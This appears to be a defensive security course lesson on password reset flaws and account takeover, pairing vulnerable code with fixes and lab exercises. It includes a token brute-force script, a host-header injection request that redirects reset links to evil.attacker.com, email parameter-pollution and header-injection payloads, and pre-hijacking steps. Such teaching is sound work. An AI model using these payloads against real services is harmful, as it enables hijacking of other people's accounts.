---
title: "Password Reset Flaws and Account Takeover"
tags: [foundation, auth, password-reset, account-takeover, host-header-injection,
       token-predictability, race-condition, email-parameter-pollution, ATO]
module: 01-Foundation-05
day: 46
related_topics:
  - API Keys, RBAC and Broken Access Control (Day 045)
  - Auth Detection and Hardening (Day 047)
  - Randomness and PRNG Attacks (Day 035)
  - Session Management (Day 040)
---

# Day 046 — Password Reset Flaws and Account Takeover

## Goals

By the end of this lesson you will be able to:

1. Enumerate six classes of password reset vulnerability.
2. Exploit a host-header injection to redirect a reset email.
3. Explain why predictable reset tokens are crackable and compute the attack
   complexity.
4. Describe a password reset race condition and how to prevent it.
5. Enumerate three methods to pre-hijack an account before it is registered.

---

## Prerequisites

- [Day 045 — API Keys, RBAC and Broken Access Control](DAY-0045-API-Keys-RBAC-and-Broken-Access-Control.md)
- [Day 035 — Randomness and PRNG Attacks](../01-Foundation-04/DAY-0035-Randomness-and-PRNG-Attacks.md)

---

## Main Content — Part 1: Password Reset Token Vulnerabilities

### 1. Predictable Reset Tokens

A reset token is a temporary credential. It must be:
- Generated from CSPRNG (not `random`, `time`, or sequential IDs)
- At least 128 bits of entropy (32 hex chars)
- One-use — invalidated on first use
- Short-lived (≤ 15 minutes)
- Tied to the specific user account (not global)

**Vulnerable patterns:**

```python
# Pattern 1 — sequential integer (trivially guessable):
token = str(user.id * 1000 + db.count_resets())

# Pattern 2 — time-seeded (brute-forceable in minutes):
import time, hashlib
token = hashlib.md5(str(time.time()).encode()).hexdigest()

# Pattern 3 — MD5 of email (static, computed, enumerable):
token = hashlib.md5(user.email.encode()).hexdigest()

# Pattern 4 — short token (4–6 digits SMS OTP style but no rate limit):
import random
token = str(random.randint(100000, 999999))  # 900,000 possibilities
```

**Attack on time-seeded token:**

```python
import time, hashlib, requests

target_email = "victim@target.com"

# Trigger reset, note the approximate time:
requests.post("https://target.com/reset", data={"email": target_email})
reset_time = int(time.time())

# Brute force within ±60 seconds:
for t in range(reset_time - 60, reset_time + 60):
    candidate = hashlib.md5(str(float(t)).encode()).hexdigest()
    resp = requests.get(f"https://target.com/reset?token={candidate}")
    if resp.status_code == 200:
        print(f"Token found: {candidate}")
        break
```

**Fix:**
```python
import secrets, hashlib

# Generate:
raw_token = secrets.token_urlsafe(32)   # 32 bytes = 256 bits

# Store the hash — not the raw token:
token_hash = hashlib.sha256(raw_token.encode()).hexdigest()
db.store_reset_token(user.id, token_hash, expires_at=now() + timedelta(minutes=15))

# Email the raw token to the user.
# On validation: hash the submitted token, compare to stored hash.
```

---

### 2. Token Not Invalidated After Use

Some applications mark the token "used" only after the new password is set.
If an error occurs between token validation and password update, the token
remains valid and can be reused.

More dangerously: some apps never invalidate old tokens, allowing an attacker
who obtains an old reset link (from email logs, browser history, Wayback
Machine) to reset the password arbitrarily.

**Fix:** Invalidate the token at the moment of first validation, before
the password change form is shown.

---

## Main Content — Part 2: Host Header Injection in Password Reset

### 3. Redirect the Reset Email to an Attacker Domain — CWE-601

**What it is:**
The server constructs the password reset URL using the `Host` header from the
incoming request. An attacker sends a reset request with a modified `Host`
header — the reset link is generated pointing to the attacker's domain.

**Why it works:**
Web frameworks often use `request.host` to build absolute URLs. The `Host`
header is under the attacker's control.

**Vulnerable code:**

```python
# Vulnerable Flask reset:
@app.route('/reset', methods=['POST'])
def reset():
    email = request.form['email']
    user = db.get_user_by_email(email)
    if user:
        token = generate_reset_token(user.id)
        # BUG: Uses Host header to build the URL:
        host = request.host   # ← Attacker-controlled!
        reset_url = f"https://{host}/reset/confirm?token={token}"
        send_email(user.email, f"Reset your password: {reset_url}")
    return "If that email exists, we sent a reset link."

# Exploit:
# POST /reset HTTP/1.1
# Host: evil.attacker.com
# Content-Type: application/x-www-form-urlencoded
#
# email=victim@target.com
#
# The victim receives an email with a link to evil.attacker.com
# When they click it, the token is sent to the attacker's server.
```

**Fix:**
```python
# Hard-code the application base URL:
BASE_URL = os.environ["APP_BASE_URL"]  # e.g. "https://app.target.com"

reset_url = f"{BASE_URL}/reset/confirm?token={token}"
```

Never construct security-critical URLs from user-supplied headers.

---

### 4. Email Parameter Pollution

Some reset endpoints accept the email address as a parameter and send to it.
Certain implementations are vulnerable to parameter pollution — two `email`
values result in the email being sent to both:

```
POST /reset
email=victim@target.com&email=attacker@evil.com
```

Or via MIME header injection in the email itself:

```
email=victim@target.com%0ACc:attacker@evil.com
```

**Fix:** Accept exactly one email parameter. Validate it as a single valid
email address. Strip all newline characters from any value used in email
headers.

---

## Main Content — Part 3: Race Conditions

### 5. Password Reset Race Condition

**Scenario:**
The server checks: "is this token valid and unused?" If two concurrent
requests arrive simultaneously with the same token, both can pass the check
before either marks it used.

```
Request 1: GET /reset/confirm?token=ABC  → checks DB: "valid and unused" = True
Request 2: GET /reset/confirm?token=ABC  → checks DB: "valid and unused" = True (request 1 hasn't updated yet)

Request 1: sets new password, marks token used
Request 2: sets new password (different password!), marks token used
```

**Impact:** The account password is unpredictably set by whichever request
wins the final DB write. In a targeted attack: attacker sends 100 concurrent
requests with different desired passwords while the victim is also completing
the reset.

**Fix:**
```sql
-- Use an atomic UPDATE that only succeeds if not already used:
UPDATE password_reset_tokens
  SET used_at = NOW()
  WHERE token_hash = $1
    AND used_at IS NULL
    AND expires_at > NOW()
RETURNING user_id;

-- If the UPDATE returns 0 rows → token already used or expired → reject
-- If the UPDATE returns 1 row → valid, proceed to update password
```

The `UPDATE ... WHERE used_at IS NULL ... RETURNING` pattern is atomic —
exactly one concurrent request can win.

---

## Main Content — Part 4: Account Pre-Hijacking

### 6. Pre-Hijacking Attacks

Account pre-hijacking exploits the gap between account creation and first
login. The attacker sets up a condition before the victim registers.

**Method 1 — Classic pre-hijacking with unverified merge:**
1. Attacker registers `victim@target.com` with a known password.
2. Victim later registers `victim@target.com` via "Sign up with Google" (SSO).
3. The app merges the accounts without verifying the password credential.
4. Both the attacker and victim now share the same account.

**Method 2 — Unexpired password reset:**
1. Attacker triggers a password reset for `victim@target.com`.
2. The app creates a reset token and associates it with the account.
3. Victim signs up (the app allows registration of an email that has a pending
   reset and doesn't invalidate old tokens on new account creation).
4. Attacker uses the reset token to take over the newly created account.

**Method 3 — Predictable username + "take over" link:**
1. Attacker registers `victim_username` before the victim.
2. The victim's username is already taken — or the attacker holds the account
   as a sleeper until the victim tries to register.

**Fix:**
- Invalidate all pending password reset tokens when a new account is created.
- Do not merge SSO accounts with existing password accounts without
  re-authentication.
- Require email verification before the account is usable.

---

## Key Takeaways

1. **The password reset flow is a backdoor.** It must be at least as secure
   as the login itself. Weak tokens, no rate limiting, or no expiry makes it
   the weakest link.
2. **Host header injection is easy to miss and easy to fix.** Hard-code your
   base URL. Never trust `request.host` for security-sensitive URL construction.
3. **Race conditions on single-use tokens require database-level atomicity.**
   Application-level "check then update" patterns are always exploitable.
4. **Pre-hijacking is underappreciated.** Most account takeover research focuses
   on active accounts. Pre-hijacking exploits the registration flow before the
   victim ever logs in.
5. **Email verification is not optional.** An account tied to an unverified
   email is an account the email owner cannot control.

---

## Exercises

### Exercise 1 — Host Header Injection Lab

Set up the vulnerable Flask app from the lesson:
1. Send a reset request with `Host: evil.attacker.com` using Burp Repeater.
2. Confirm the generated URL uses `evil.attacker.com`.
3. Fix the code and confirm the URL uses the hardcoded base URL regardless
   of the Host header.

### Exercise 2 — Token Entropy Analysis

Write a Python script that:
1. Calls a local reset endpoint 20 times.
2. Collects the 20 reset tokens.
3. Reports: length, character set, apparent entropy in bits.
4. Attempts to detect patterns (sequential, time-based, hash of known input).

---

## Questions

### Open Questions

*(none yet — add yours here)*

---

### Answered Questions

*(none yet)*

---

*Previous: [Day 045 — API Keys, RBAC and Broken Access Control](DAY-0045-API-Keys-RBAC-and-Broken-Access-Control.md)*
*Next: [Day 047 — Auth Detection, Logging and Hardening](DAY-0047-Auth-Detection-Logging-and-Hardening.md)*
